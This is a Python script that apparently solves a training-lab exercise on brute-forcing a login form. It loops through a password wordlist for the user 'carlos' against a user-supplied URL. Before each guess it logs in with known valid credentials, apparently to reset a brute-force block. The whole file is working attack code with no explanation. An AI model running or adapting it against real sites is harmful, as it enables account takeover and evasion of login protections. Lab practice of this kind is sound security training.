import requests
import os

def get_password_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    passwords_path = os.path.join(parent_dir, '../wordlists', 'passwords.txt')
    with open(passwords_path, 'r') as f:
        return f.read().splitlines()
    
def get_username_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    users_path = os.path.join(parent_dir, '../wordlists', 'users.txt')
    with open(users_path, 'r') as f:
        return f.read().splitlines()

LAB_URL= input("Enter the URL of the lab: ")

def send_valid_credentials() -> bool:
    valid_credentials = {
        "username": "wiener",
        "password": "peter"
    }
    r = requests.post(LAB_URL, data=valid_credentials)

    if r.status_code == 302:
        return True
    else: 
        return False
    
def brute_force(passwords: list[str]) -> None:

    for password in passwords:

        brute_attempt = {
            "username": "carlos",
            "password": password
        }

        print(brute_attempt)
        send_valid_credentials()
        r = requests.post(LAB_URL, data=brute_attempt)

        
        if "Incorrect password" not in r.text:
            print(f"Found password {password} for user carlos")
            break

if __name__ == "__main__":
    passwords = get_password_wordlist()
    brute_force(passwords)
